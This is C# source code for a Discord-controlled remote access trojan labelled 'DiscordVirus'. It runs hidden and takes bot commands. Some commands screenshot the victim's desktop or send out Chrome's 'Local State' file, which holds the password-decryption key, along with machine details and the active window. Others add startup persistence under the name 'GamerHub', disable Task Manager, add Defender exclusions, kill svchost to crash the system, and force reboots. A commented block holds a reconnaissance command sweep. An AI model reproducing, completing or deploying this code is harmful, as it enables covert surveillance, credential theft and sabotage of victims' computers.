//Code By Astra
using AudioSwitcher.AudioApi.CoreAudio;
using Discord;
using Discord.WebSocket;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DiscordVirus
{

    public class Program
    {
        private static string CurrentActiveWindowTitle;


        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
        private static extern IntPtr SendMessageW(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        public static void Main(string[] args)
        => new Program().MainAsync().GetAwaiter().GetResult();

        private DiscordSocketClient _client;


        public async Task MainAsync()
        {

            const int SW_HIDE = 0;
            //const int SW_SHOW = 5;
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            //ShowWindow(handle, SW_SHOW);

            _client = new DiscordSocketClient();
            _client.MessageReceived += CommandHandler;
            _client.Log += Log;

            var token = ""; //PUT HERE YOUR BOT TOKEN ;)


            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();

            await Task.Delay(-1);
        }

        private Task Log(LogMessage msg)
        {
            Console.WriteLine(msg.ToString());
            return Task.CompletedTask;
        }

        private Task CommandHandler(SocketMessage message)
        {
            //actual commands here
            if (message.Content == "!Ping")
            {
                message.Channel.SendMessageAsync($@"Pong, {message.Author.Mention} :sunglasses:");
            }


            if (message.Content == "!helpES")
            {
                var help = new EmbedBuilder();
                help.WithTitle("CEX COMANDOS ESPAÑOL --------> V1.2");
                help.WithDescription("!Ping - Con este comando comprobaras si hay conexion\n\n !Capture/!DeleteCapture - Con este comando sacara una captura del ordenador de la victima\n\n !BlueScreen - Con este comando simularas una pantalla azul en windows (se necesita permisos de administrador)\n\n !ChromePass - Con este comando te devolvera a discord las contraseñas encryptadas \n\n !MachineName / !Ip - Con estos comandos podras saber el nombre del pc y la ip privada\n\n !CMDShutDown / !ShutdownPws / !RebootPws - Con estos comandos podras apagar o reiniciar el Pc de la victima\n\n !VolumenUp - Con este comando podras subir el volumen al maximo\n\n !StartupYes / !StartupNo - Con este comando pondras el rat en el startup o sea en el inicio\n\n !DisableTSK - Con este comando desabilitaras el administrador de tareas (necesita permisos de administrador)\n\n !HideDesktopIcons - Con este comandos escondera las iconos del escritorio\n\n !AddExclusions - Con este comando pondra (necesita permisos de administrador)\n\n !OsVersion - Con este comando mostrara el sistema operativo que tiene la victima\n\n !GetProgramList - Con este comando te dira los programas que tienes instalados en la pc de la victima\n\n !GetActiveWindowTitle - Con este comando mostrara lo que esta acciendo la victima o sea en que aplicacion esta\n\n !GetCPUName - Con este comando podras ver que CPU tiene nuestra victima\n\n !GetGPUName - Con este comando podras ver la GPU que tiene el ordenador (solo muestra una tarjeta grafica)");
                help.WithColor(Discord.Color.Red);
                message.Channel.SendMessageAsync("", false, help.Build());
            }
            if (message.Content == "!helpEN")
            {
                var help = new EmbedBuilder();
                help.WithTitle("CEX ENGLISH COMMANDS --------> V1.2");
                help.WithDescription("!Ping - With this command you will check if there is a connection\n\n !Capture/!DeleteCapture - With this command you will take a screenshot of the victim's computer\n\n - !BlueScreen - With this command you will simulate a blue screen in windows (administrator permissions are needed )\n\n !ChromePass - With this command you will return the encrypted passwords to discord \n\n !MachineName / !Ip - With these commands you will be able to know the name of the pc and the private IP\n\n !CMDShutDown / !ShutdownPws / !RebootPws - With these commands you will be able to turn off or restart the victim's PC\n\n !VolumeUp - With this command you will be able to raise the volume to maximum\n\n !StartupYes / !StartupNo - With this command you will put the mouse on the startup that is at startup\n\n !DisableTSK - With this command you will disable the task manager (it needs administrator permissions)\n\n !HideDesktopIcons - With this command you will hide the desktop icons\n\n !AddExclusions - With this command you will put (need admin permissions)");
                help.WithColor(Discord.Color.DarkGreen);
                message.Channel.SendMessageAsync("", false, help.Build());
            }

            if (message.Content == "!Capture")
            {
                GetDesktop();
                message.Channel.SendFileAsync("AoznWvhg.jpg");
            }
            if (message.Content == "!DeleteCapture")
            {
                {
                    DeleteCapture();
                    message.Channel.SendMessageAsync("The image was delete");
                }
            }

            if (message.Content == "!BlueScreen")
            {
                message.Channel.SendMessageAsync("The command was executed :smiling_imp: " + SimulateBOSD());
            }

            if (message.Content == "!ChromePass")
            {
                message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Local State");
            }

            if (message.Content == "!MachineName")
            {
                message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName);
            }
            if (message.Content == "!GetVersion")
            {
                message.Channel.SendMessageAsync("This windows is" + getBitVersion());
            }
            if (message.Content == "!IP")
            {
                message.Channel.SendMessageAsync("Private ip address: " + GetIp());
            }
            if (message.Content == "!CMDShutDown")
            {
                message.Channel.SendMessageAsync("The command was executed: " + CMD());
            }
            if (message.Content == "!VolumenUp")
            {
                Volume();
                message.Channel.SendMessageAsync("VolumenUp works");
            }
            if (message.Content.StartsWith("!HideDesktopIcons"))
            {
                message.Channel.SendMessageAsync("You hid the icons, ignore this: " + ToggleDesktopIcons());
            }

            if (message.Content.StartsWith("!StartupYes"))
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("GamerHub", $@"{System.Windows.Forms.Application.ExecutablePath}");
            }

            if (message.Content.StartsWith("!StartupNo"))
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.DeleteValue("GamerHub", false);
            }

            if (message.Content.StartsWith("!DeleteImage"))
            {
                DeleteImage();
                message.Channel.SendMessageAsync("The image was delete");
            }
            if (message.Content.StartsWith("!ShutdownPws"))
            {
                ShutdownPWS();
                message.Channel.SendMessageAsync("The pc was shutdown");
            }

            if (message.Content.StartsWith("!RebootPws"))
            {
                RebootSystem();
                message.Channel.SendMessageAsync("The pc was rebooted");
            }
            if (message.Content.StartsWith("!AddExclusions")) //need Admin
            {
                AddExlusionsWD();
                message.Channel.SendMessageAsync("The Exclusions was sucesfully added");
            }
            if (message.Content.StartsWith("!GetProgramList"))
            {
                message.Channel.SendMessageAsync(GetProgramsList());
            }
            if (message.Content.StartsWith("!OsVersion"))
            {
                message.Channel.SendMessageAsync(GetWindowsVersionName());
            }
            if (message.Content.StartsWith("!GetActiveWindowTitle"))
            {
                message.Channel.SendMessageAsync(GetActiveWindowTitle());
            }
            if (message.Content.StartsWith("!GetCPUName"))
            {
                message.Channel.SendMessageAsync(GetCPUName());
            }
            if (message.Content.StartsWith("!GetGPUName"))
            {
                message.Channel.SendMessageAsync(GetGPUName());
            }
            if(message.Content.StartsWith("!PCinfo"))
            {
                message.Channel.SendMessageAsync(PCInfo());
            }
            if (message.Content.StartsWith("!DisableTSK"))
            {
                {
                    RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                    if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                        objRegistryKey.SetValue("DisableTaskMgr", "1");
                    else
                        objRegistryKey.DeleteValue("DisableTaskMgr");
                    objRegistryKey.Close();
                    {
                        message.Channel.SendMessageAsync("This command works");
                    }
                }
            }
            return Task.CompletedTask;
        }


        void GetDesktop()
        {
            Rectangle size = Screen.GetBounds(Point.Empty);
            Bitmap captureBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            captureBitmap.Save("AoznWvhg.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);

        }

        void DeleteCapture()
        {
            File.Delete("AoznWvhg.jpg");
        }

        void DeleteImage()
        {
            File.Delete(@"C:\Users\ACER_PC\Desktop\Discord RAT\project\Discord Rat Virus\bin\Release\WhyMe.jpg");
        }



        string GetIp()
        {
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
                throw new Exception("No network adapters with an IPv4 address in the system! c:");
            }
        }
        string CMD()
        {
            string strCmdText;
            strCmdText = "/C shutdown /r";
            System.Diagnostics.Process.Start("CMD.exe", strCmdText);
            {
                return strCmdText.ToString();
            }
        }

        [DllImport("user32.dll", SetLastError = true)] static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)] static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);
        enum GetWindow_Cmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        private const int WM_COMMAND = 0x111;

        string ToggleDesktopIcons()
        {
            var toggleDesktopCommand = new IntPtr(0x7402);
            IntPtr hWnd = GetWindow(FindWindow("Progman", "Program Manager"), GetWindow_Cmd.GW_CHILD);
            SendMessage(hWnd, WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
            {
                return toggleDesktopCommand.ToString();
            }
        }
        //Permisos de administracion
        string SimulateBOSD()
        {
            string strCmdText;
            strCmdText = "/C taskkill /IM svchost.exe /F";
            System.Diagnostics.Process.Start("CMD.exe", strCmdText);
            {
                return strCmdText.ToString();
            }
        }
        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
        void Volume()
        {
            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            Debug.WriteLine("Current Volume:" + defaultPlaybackDevice.Volume);
            defaultPlaybackDevice.Volume = 100;

            //keybd_event((byte)Keys.VolumeUp, 0, 0, 0); // increase volume

            //keybd_event((byte)Keys.VolumeDown, 0, 0, 0); // decrease volume
        }
        void ShutdownPWS()
        {
            PowerShell ps = PowerShell.Create();
            ps.AddScript("Stop-Computer").Invoke();
        }
        void RebootSystem()
        {
            PowerShell ps = PowerShell.Create();
            ps.AddScript("Restart-Computer -Force").Invoke();
        }
        void AddExlusionsWD() //need Admin perms ;c
        {
            using (PowerShell PowerShellInst = PowerShell.Create())
            {
                PowerShellInst.AddScript(@"Add-MpPreference -ExclusionPath .exe ");
                Collection<PSObject> PSOutput = PowerShellInst.Invoke();
            }
        }
        string getBitVersion()
        {
            if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86"))
            {
                return "(32 Bit)";
            }
            else
            {
                return "(64 Bit)";
            }
        }
        public static string GetProgramsList()
        {
            List<string> programs = new List<string>();

            foreach (string program in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)))
            {
                programs.Add(new DirectoryInfo(program).Name);
            }
            foreach (string program in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles)))
            {
                programs.Add(new DirectoryInfo(program).Name);
            }

            return string.Join(", ", programs) + ".";

        }
        public static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                string title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = p.ProcessName;
                CurrentActiveWindowTitle = title;
                return title;
            }
            catch (Exception)
            {
                return "Unknown";
            }
        }
        private static string GetWindowsVersionName()
        {
            using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
            {
                string sData = string.Empty;
                foreach (ManagementObject tObj in mSearcher.Get())
                {
                    sData = Convert.ToString(tObj["Name"]);
                }
                try
                {
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
                catch { sData = "Unknown System"; }
                return sData;
            }
        }
        string GetCPUName()
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    return mObject["Name"].ToString();
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }
        /*void cmd()
        {
            string commands = "echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\\WINDOWS\\System32\\drivers\\etc\\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config";
            Process.Start("cmd.exe", commands);
        }
        /*
        */

        // Get GPU name
        string GetGPUName()
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    return mObject["Name"].ToString();
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }
        string PCInfo()
        {
            // new Process() { StartInfo = new ProcessStartInfo("echo", "Hello, World") }.Start();

            new Process() { StartInfo = new ProcessStartInfo("notepad.exe") }.Start();
            return "Unknown";
        }
    }
}
//Code By Astra
